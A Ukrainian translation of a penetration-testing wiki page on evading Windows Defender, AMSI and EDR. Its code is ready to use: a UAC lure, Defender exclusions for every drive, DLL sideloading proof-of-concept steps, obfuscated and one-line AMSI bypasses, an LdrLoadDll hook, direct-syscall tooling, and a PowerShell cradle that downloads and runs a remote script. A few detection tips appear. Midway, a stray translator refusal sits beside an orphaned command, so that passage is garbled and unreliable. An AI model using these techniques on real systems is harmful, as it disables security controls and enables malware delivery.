# Обхід Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки Windows Defender, що видає себе за інший AV.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка у стилі інсталятора з UAC перед втручанням у роботу Defender

Публічні лоадери, що видають себе за чити для ігор, часто постачаються як непідписані інсталятори Node.js/Nexe, які спочатку **запитують у користувача підвищення привілеїв**, а вже потім нейтралізують Defender. Схема проста:

1. Перевірити наявність прав адміністратора за допомогою `net session`. Команда виконується успішно лише за наявності прав адміністратора, тож невдача означає, що лоадер запущено від імені звичайного користувача.
2. Негайно перезапустити себе з дієсловом `RunAs`, щоб викликати очікуваний запит UAC на надання згоди, зберігши початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви й так вважають, що встановлюють «cracked»-програмне забезпечення, тож зазвичай погоджуються із запитом, надаючи malware потрібні права для зміни політики Defender.<sup>[[26]](#references)</sup>

### Виключення `MpPreference` для всіх літер дисків

Після підвищення привілеїв ланцюжки на кшталт GachiLoader максимізують сліпі зони Defender замість того, щоб повністю вимикати службу. Спочатку loader завершує роботу GUI-наглядача (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, щоб профілі всіх користувачів, системні каталоги й знімні диски стали недоступними для сканування:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Цикл проходить по всіх змонтованих файлових системах (D:\, E:\, USB-накопичувачі тощо), тому **будь-який payload, який у майбутньому буде розміщено будь-де на диску, ігноруватиметься**.
- Виключення розширення `.sys` враховує майбутні дії: зловмисники залишають собі можливість пізніше завантажувати непідписані драйвери, не взаємодіючи з Defender повторно.
- Усі зміни вносяться в `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає змогу наступним етапам перевіряти, чи збереглися виключення, або розширювати їх без повторного виклику UAC.

Оскільки службу Defender не зупинено, примітивні перевірки стану й надалі повідомляють, що «антивірус активний», хоча перевірка в реальному часі не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія обходу AV**

Зараз AV використовують різні методи, щоб визначити, чи є файл шкідливим: статичне виявлення, динамічний аналіз і, у просунутіших EDR, поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення працює шляхом пошуку відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також вилучення інформації безпосередньо з файлу (наприклад, опису файлу, назви компанії, цифрових підписів, іконки, контрольної суми тощо). Це означає, що використання відомих публічних інструментів може швидше призвести до виявлення, оскільки їх, імовірно, уже проаналізували й позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати бінарний файл, AV не зможе виявити вашу програму, але для розшифрування та запуску програми в пам’яті знадобиться певний loader.

- **Обфускація**

Іноді достатньо змінити кілька рядків у бінарному файлі чи скрипті, щоб обійти AV, але залежно від того, що саме ви намагаєтеся обфускувати, це може забрати багато часу.

- **Власні інструменти**

Якщо розробити власні інструменти, для них не буде відомих шкідливих сигнатур, але це потребує багато часу й зусиль.

> [!TIP]
> Щоб перевірити файл на предмет статичного виявлення Windows Defender, скористайтеся [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він розбиває файл на кілька сегментів і змушує Defender сканувати кожен окремо. Так можна точно визначити, які рядки або байти у вашому бінарному файлі позначаються як шкідливі.

Наполегливо рекомендую переглянути цей [плейлист на YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичне уникнення виявлення AV.

### Офлайн-перевірки PE-ознак для статичних класифікаторів

Байти упакованого або зашифрованого payload — лише одне з джерел даних для статичного класифікатора. EMBER2024 вилучає PE-ознаки, зокрема імпорти, експорти, секції, заголовки та дані Authenticode.<sup>[[48]](#references)</sup> В одному експерименті з loader додавання 141 імпорту, що виглядали нешкідливими, знизило оцінку шкідливості EMBER2024 на 93%, тоді як імпорти, пов’язані зі шкідливим ПЗ, підвищували її. Цей результат стосується саме цієї моделі та цих зразків і не є надійним способом обійти конкретний продукт AV/EDR.<sup>[[50]](#references)</sup>

Для авторизованого тестування loader залишайте payload і шлях виконання незмінними, змінюйте в кожному варіанті лише одну заплановану змінну збірки та порівнюйте оцінки офлайн. Перевіряйте отримані PE-ознаки, оскільки зміна збірки може вплинути не на одну групу ознак.<sup>[[49]](#references)[[50]](#references)</sup> Щоб потрібні імпорти залишалися в IAT, викликайте вибрані Win32 API з досяжного коду. Змінюйте набір API та розподіляйте місця викликів між збірками, а не створюйте фіксовану функцію маскування, яка може стати сигнатурою. В експерименті також повідомлялося про нижчі оцінки за наявності дійсного підпису коду, записів експорту та більшої кількості функцій, що збільшують `.pdata`; недійсний підпис майже не вплинув на результат, а ефект `.pdata` був незначним.<sup>[[50]](#references)</sup>

Пакет `thrember` забезпечує вилучення ознак і містить еталонні моделі. Після його встановлення викличте `thrember.download_models("models")`, указавши наявний каталог `models`, а потім запустіть оцінювач із батьківського каталогу: допоміжна функція завантаження змінює поточний робочий каталог. PE-класифікатор може оцінити каталог збірок, не надсилаючи їх до сервісу сканування:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Під час порівняння залишайте версії моделі та екстрактора ознак незмінними. Нижчий офлайн-показник лише свідчить про те, як цей класифікатор реагує на змінений бінарний файл; він не доводить обходу поведінкового аналізу, емуляції чи іншої моделі постачальника.<sup>[[49]](#references)[[50]](#references)</sup> Докладніше про [поліморфізм для кожної збірки та маскування зовнішнього бінарного файла у віртуалізованих payload](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) див. в окремій моделі виконання.

### **Dynamic analysis**

Динамічний аналіз — це коли AV запускає ваш бінарний файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі з браузера, створенням minidump для LSASS тощо). Працювати з цією частиною може бути трохи складніше, але ось кілька способів обійти sandbox.

- **Затримка перед виконанням** Залежно від реалізації, це може бути чудовим способом обходу динамічного аналізу AV. AV має дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому тривалі затримки можуть завадити аналізу бінарних файлів. Проблема в тому, що багато sandbox AV можуть просто пропустити затримку — залежно від того, як її реалізовано.
- **Перевірка ресурсів комп’ютера** Зазвичай sandbox має дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони можуть сповільнити роботу комп’ютера користувача. Тут можна проявити креативність, наприклад, перевірити температуру CPU або навіть швидкість обертання вентиляторів: у sandbox може бути реалізовано не все.
- **Перевірки, специфічні для комп’ютера** Якщо ви хочете націлитися на користувача, чия робоча станція приєднана до домену "contoso.local", можна перевірити домен комп’ютера й порівняти його із заданим. Якщо він не збігається, програма може завершити роботу.

Виявляється, ім’я комп’ютера в sandbox Microsoft Defender — HAL9TH. Тож перед детонацією malware можна перевірити ім’я комп’ютера: якщо воно збігається з HAL9TH, це означає, що ви перебуваєте в sandbox Defender, і програма може завершити роботу.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ось кілька інших чудових порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії sandbox.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже казали в цій публікації, **публічні інструменти** зрештою **виявлятимуться**, тож варто поставити собі таке запитання:

Наприклад, якщо ви хочете створити дамп LSASS, **чи справді вам потрібно використовувати mimikatz**? Чи можна скористатися менш відомим проєктом, який також створює дамп LSASS?

Імовірно, правильна відповідь — останній варіант. Наприклад, mimikatz — це, мабуть, одна з найбільш позначуваних AV та EDR програм, якщо не найбільш позначувана. Хоч сам проєкт і дуже крутий, обійти AV, працюючи з ним, — справжній кошмар. Тож просто шукайте альтернативи для досягнення своєї мети.

> [!TIP]
> Змінюючи payload для обходу виявлення, обов’язково **вимкніть автоматичне надсилання зразків** у Defender і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ЇХ НА VIRUSTOTAL**, якщо ваша мета — довготривалий обхід виявлення. Якщо ви хочете перевірити, чи виявляє певний AV ваш payload, встановіть його на VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, для обходу виявлення завжди **віддавайте перевагу DLL**. З мого досвіду, DLL-файли зазвичай **виявляють і аналізують набагато рідше**, тож у деяких випадках це простий спосіб уникнути виявлення (якщо ваш payload, звісно, можна запускати як DLL).

Як видно на цьому зображенні, показник виявлення DLL payload від Havoc на antiscan.me становить 4/26, тоді як для EXE payload він дорівнює 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного Havoc EXE payload зі звичайним Havoc DLL</p></figcaption></figure>

Далі покажемо кілька прийомів для DLL-файлів, які допоможуть зробити їх значно менш помітними.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, застосовуваний завантажувачем: вразливу програму та шкідливі payload розміщують поруч.

Виявити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та такого скрипту PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у "C:\Program Files\\" , уразливих до DLL hijacking, і файлів DLL, які вони намагаються завантажити.

Наполегливо рекомендую **самостійно дослідити програми, уразливі до DLL Hijacking/Sideloading**. За належного виконання ця техніка досить прихована, але якщо використовувати загальновідомі програми з підтримкою DLL Sideloading, вас можуть легко виявити.

Просте розміщення шкідливої DLL із назвою, яку програма очікує завантажити, не запустить ваш payload, оскільки програма очікує наявності в цій DLL певних функцій. Щоб вирішити цю проблему, ми використаємо іншу техніку — **DLL Proxying/Forwarding**.

**DLL Proxying** переспрямовує виклики програми з proxy (і шкідливої) DLL до оригінальної DLL, зберігаючи функціональність програми та даючи змогу виконати ваш payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, яких я дотримувався:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну DLL зі зміненою назвою.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають рівень виявлення 0/26 на [antiscan.me](https://antiscan.me)! Це можна вважати успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Наполегливо рекомендую** переглянути [запис трансляції S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб докладніше дізнатися про те, що ми обговорили.

### Зловживання переспрямованими експортами (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «forwarder-ами»: замість посилання на код, запис експорту містить рядок ASCII формату `TargetDll.TargetFunc`. Коли викликач шукає цей експорт, завантажувач Windows:

- Завантажує `TargetDll`, якщо він ще не завантажений
- Шукає в ньому `TargetFunc`

Важливо розуміти такі особливості:
- Якщо `TargetDll` є KnownDLL, його надає захищений простір імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає каталог модуля, що виконує переспрямування.

Це дає змогу застосувати непрямий примітив sideloading: знайти підписану DLL, яка експортує функцію, переспрямовану до модуля з назвою, що не є KnownDLL, а потім розмістити поруч із цією підписаною DLL контрольовану зловмисником DLL з точною назвою цільового модуля. Коли викликається переспрямований експорт, завантажувач обробляє переспрямування й завантажує вашу DLL з того самого каталогу, виконуючи її DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому його пошук виконується у звичайному порядку.

PoC (копіювання-вставлення):
1) Скопіюйте підписану системну DLL до папки з правом запису.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливу `NCRYPTPROV.dll` у ту саму папку. Для виконання коду достатньо мінімальної функції DllMain; щоб викликати DllMain, реалізовувати переспрямовану функцію не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Запустіть пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час пошуку `KeyIsoSetAuditingInterface` завантажувач переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` із `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка «missing API» з’явиться лише після того, як `DllMain` уже виконається

Поради з пошуку:
- Зосередьтеся на forwarded exports, у яких цільовий модуль не є KnownDLL. KnownDLL перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Перелічити forwarded exports можна за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте список форвардерів Windows 11, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL з нестандартних системних шляхів, а потім завантажують із цієї директорії DLL, що не належать до KnownDLLs, з такою самою базовою назвою
- Створюйте сповіщення про ланцюжки процесів/модулів на кшталт: `rundll32.exe` → нестандартний системний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачам
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте запис і виконання в директоріях застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze — це набір інструментів для payload, призначений для обходу EDR за допомогою призупинених процесів, прямих системних викликів і альтернативних методів виконання`

За допомогою Freeze можна непомітно завантажувати та виконувати shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ухилення — це гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити. Тож ніколи не покладайтеся лише на один інструмент і, якщо можливо, спробуйте поєднувати кілька технік ухилення.

## Прямі/непрямі Syscalls і визначення SSN (SysWhispers4)

EDR часто встановлюють **inline hooks у user-mode** на syscall-заглушки `ntdll.dll`. Щоб обійти ці hooks, можна створити **прямі** або **непрямі** syscall-заглушки, які завантажують правильний **SSN** (System Service Number) і переходять у режим ядра, не виконуючи hooked entrypoint експорту.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Прямий (вбудований)**: генерує інструкцію `syscall`/`sysenter`/`SVC #0` у заглушці (не звертається до експорту `ntdll`).
- **Непрямий**: переходить до наявного `syscall` gadget усередині `ntdll`, щоб перехід у режим ядра виглядав так, ніби він походить із `ntdll` (корисно для ухилення від евристичного виявлення); **рандомізований непрямий** варіант вибирає gadget із пулу під час кожного виклику.
- **Пошук egg**: не вбудовує статичну послідовність opcode `0F 05` у файл на диску; знаходить syscall-послідовність під час виконання.

**Стратегії визначення SSN, стійкі до hooks:**
- **FreshyCalls (VA sort)**: визначає SSN, сортувавши syscall-заглушки за віртуальними адресами, а не читаючи байти заглушок.
- **SyscallsFromDisk**: відображає чистий `\KnownDlls\ntdll.dll`, читає SSN із його `.text`, а потім скасовує відображення (обходить усі hooks у пам’яті).
- **RecycledGate**: поєднує визначення SSN за сортуванням VA з перевіркою opcode, якщо заглушка чиста; якщо вона hooked, переходить до визначення за VA.
- **HW Breakpoint**: встановлює DR0 на інструкцію `syscall` і використовує VEH, щоб під час виконання отримати SSN з `EAX`, не аналізуючи hooked байти.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тому, якщо вам вдавалося виконувати payloads **безпосередньо в пам’яті**, AV не міг цьому завадити, оскільки не мав достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- User Account Control, або UAC (підвищення привілеїв EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне обчислення коду)
- Windows Script Host (wscript.exe та cscript.exe)
- JavaScript і VBScript
- макроси Office VBA

Вона дає змогу антивірусним рішенням перевіряти поведінку скриптів, надаючи їхній вміст у незашифрованому та не обфускованому вигляді.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, що на початку додається `amsi:`, а потім шлях до виконуваного файла, з якого запустили скрипт; у цьому випадку це powershell.exe.

Ми не записували жодного файла на диск, але все одно були виявлені в пам’яті через AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також проходить перевірку через AMSI. Це впливає навіть на `Assembly.Load(byte[])`, який завантажує код для виконання в пам’яті. Тому для виконання в пам’яті, якщо потрібно обійти AMSI, рекомендується використовувати старіші версії .NET (наприклад, 4.7.2 або попередні).

Є кілька способів обійти AMSI:

- **Обфускація**

Оскільки AMSI переважно використовує статичне виявлення, зміна скриптів, які ви намагаєтеся завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI може знімати обфускацію зі скриптів, навіть якщо вони мають кілька рівнів, тому обфускація може бути невдалим варіантом — залежно від способу її застосування. Через це обхід не завжди простий. Хоча іноді достатньо змінити кілька імен змінних, щоб усе спрацювало, тож результат залежить від того, наскільки щось було позначено як підозріле.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), її легко підмінити навіть із непривілейованого облікового запису. Через цей недолік реалізації AMSI дослідники знайшли кілька способів обходити сканування AMSI.

**Примусове спричинення помилки**

Якщо змусити ініціалізацію AMSI завершитися помилкою (`amsiInitFailed`), сканування для поточного процесу не запускатиметься. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру, щоб запобігти ширшому використанню цього методу.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Щоб зробити AMSI непридатним для поточного процесу powershell, вистачило одного рядка коду. Звісно, сам AMSI позначив цей рядок, тож для використання цієї техніки його потрібно змінити.

Ось змінений AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Пам’ятайте: цю публікацію, імовірно, позначать після її виходу, тож не публікуйте код, якщо плануєте залишитися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона полягає в пошуку адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезаписі її інструкціями, які повертають код E_INVALIDARG. У результаті фактичного сканування повертається 0, що інтерпретується як чистий результат.

> [!TIP]
> Прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Існує також багато інших технік обходу AMSI за допомогою powershell. Щоб дізнатися про них більше, перегляньте [**цю сторінку**](basic-powershell-for-pentesters/index.html#amsi-bypass) і [**цей репозиторій**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Перенаправлення scan-pointer в AMSI COM замість патчингу `AmsiScanBuffer`

Ще один обхід, локальний для процесу, не змінює точку входу `AmsiScanBuffer`. У описаному 64-бітному .NET loader створюється об’єкт AMSI COM із CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` повертає вказівник на інтерфейс, а слот його vtable зі зміщенням `0x18` використовується як ціль виклику сканування. Loader патчить нативний вказівник для `Console.Clear()` невеликим x64 stub, змінює цей елемент vtable на stub за допомогою `VirtualProtect()`, а потім відновлює початковий захист сторінки. Для цього потрібні 64-бітна ширина вказівника та очікувана структура COM; це не універсальне зміщення для довільних інтерфейсів AMSI чи збірок. Раніше спостережені етапи: [завантаження підписаного sidecar-файлу AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) і [десеріалізація RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Спостережені байти stub — `41 C7 00 01 00 00 00 33 C0 C3`: вони записують **1** у вказівник результату в `r8` і повертають **0** у `eax`. Отже, твердження в описі, що результат сканування — `AMSI_RESULT_CLEAN` (0), помилково ототожнює значення повернення `S_OK` із вихідним enum. Згідно з документованим порядком `AMSI_RESULT`, значення **1** — це `AMSI_RESULT_NOT_DETECTED`; воно все ще нижче порога виявлення.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Блокування AMSI через запобігання завантаженню amsi.dll (хук LdrLoadDll)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний обхід, незалежний від мови програмування, — встановити хук у режимі користувача на `ntdll!LdrLoadDll`, який повертатиме помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і сканування в цьому процесі не виконується.<sup>[[23]](#references)</sup>

Загальна схема реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Не можу перекладати інструкції з обходу AMSI та уникнення виявлення AV/EDR. Можу допомогти перекласти матеріал про виявлення й захист від таких технік.

```bash
powershell.exe -version 2
```

## Логування PS

Логування PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту й усунення несправностей, але також може стати **проблемою для зловмисників, які хочуть уникнути виявлення**.

Щоб обійти логування PowerShell, можна скористатися такими методами:

- **Вимкнути PowerShell Transcription і Module Logging**: для цього можна скористатися таким інструментом, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використовувати PowerShell версії 2**: якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож можна запускати скрипти без перевірки AMSI. Для цього виконайте: `powershell.exe -version 2`
- **Використовувати некерований сеанс PowerShell**: скористайтеся [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (цей підхід використовує `powerpick` від Cobalt Strike). Це дає змогу обійти засоби контролю, прив’язані саме до процесу `powershell.exe`, але не вимикає автоматично AMSI, Script Block Logging чи інші засоби захисту PowerShell; охоплення залежить від середовища виконання та реалізації хоста.


## Obfuscation

> [!TIP]
> Деякі методи обфускації спираються на шифрування даних, що підвищує ентропію бінарного файлу й полегшує його виявлення засобами AV та EDR. Будьте обережні й, можливо, шифруйте лише певні фрагменти коду, які містять чутливі дані або мають бути приховані.

### Деобфускація бінарних файлів .NET, захищених ConfuserEx

Під час аналізу malware, що використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома рівнями захисту, які блокують декомпілятори й sandbox-середовища. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1. Видалення захисту від втручання — ConfuserEx шифрує кожне *тіло методу* й розшифровує його у статичному конструкторі *модуля* (`<Module>.cctor`). Він також змінює контрольну суму PE, тож будь-яка модифікація призведе до аварійного завершення бінарного файлу. Скористайтеся **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR-ключі й переписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output містить 6 параметрів anti-tamper (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів / потоку керування — передайте *очищений* файл у **de4dot-cex** (форк de4dot із підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Прапорці:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує control-flow flattening, відновить оригінальні простори імен, класи та назви змінних, а також розшифрує рядкові константи.

3.  Видалення proxy calls – ConfuserEx замінює прямі виклики методів легковагими обгортками (так званими *proxy calls*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні API .NET, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

